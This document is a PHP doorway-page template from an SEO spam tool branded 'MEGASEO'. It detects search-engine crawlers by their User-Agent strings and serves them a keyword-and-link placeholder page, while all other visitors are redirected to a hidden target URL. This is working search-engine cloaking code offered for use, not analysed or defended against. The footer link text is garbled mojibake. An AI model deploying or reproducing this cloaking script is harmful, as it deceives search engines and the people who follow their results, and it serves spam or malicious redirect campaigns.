<?php
function SpiderDetect($USER_AGENT)
{
    $engines = array(
    array('Aport', 'Aport robot'),
    array('Google', 'Google'),
    array('msnbot', 'MSN'),
    array('Rambler', 'Rambler'),
    array('Yahoo', 'Yahoo'),
    array('AbachoBOT', 'AbachoBOT'),
    array('accoona', 'Accoona'),
    array('AcoiRobot', 'AcoiRobot'),
    array('ASPSeek', 'ASPSeek'),
    array('CrocCrawler', 'CrocCrawler'),
    array('Dumbot', 'Dumbot'),
    array('FAST-WebCrawler', 'FAST-WebCrawler'),
    array('GeonaBot', 'GeonaBot'),
    array('Gigabot', 'Gigabot'),
    array('Lycos', 'Lycos spider'),
    array('MSRBOT', 'MSRBOT'),
    array('Scooter', 'Altavista robot'),
    array('AltaVista', 'Altavista robot'),
    array('WebAlta', 'WebAlta'),
    array('IDBot', 'ID-Search Bot'),
    array('eStyle', 'eStyle Bot'),
    array('Mail.Ru', 'Mail.Ru Bot'),
    array('Scrubby', 'Scrubby robot'),
    array('Yandex', 'Yandex'),
    array('YaDirectBot', 'Yandex Direct')
    );
    
    foreach ($engines as $engine)
    {
        if (strstr($USER_AGENT, $engine[0]))
        {
            return($engine[1]);
        }
    }

    return (false);
}
$detect = SpiderDetect($_SERVER['HTTP_USER_AGENT']);
if ($detect)
{
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<title><!--title--></title>
<meta http-equiv="Content-Type" content="text/html;charset=windows-1251" />
<!--description-->
<!--keywords-->
<meta name="generator" content="MEGASEO V 0.1 -  http://good-job.ws">
<meta name="robots" content="All, Index">
<!--script-->
</head>
<body>
<!--h1-->
<p style="text-align:center"><!--links1--></p>
<table>
<tr><td style="width:200px;vertical-align:top"></td><td><!--image-->
</td></tr><tr><td style="vertical-align:top;font-size:11px">
<!--menu-->
</td><td style="vertical-align:top">
<!--content-->
</td></tr>
<tr><td colspan="2"><center><!--links--></center></td></tr>
<tr><td><em style="margin-left:10px">&copy; <!--copy--></em></td><td><b style="margin-right:160px;font-size:8pt">Megaseo v 0.2 <a href="http://good-job.ws">סאיע ןנמדנאללû</a></b></td></tr></table></body></html>
<?  
}
else
{
   header("location: <!--upurl-->");
}
?>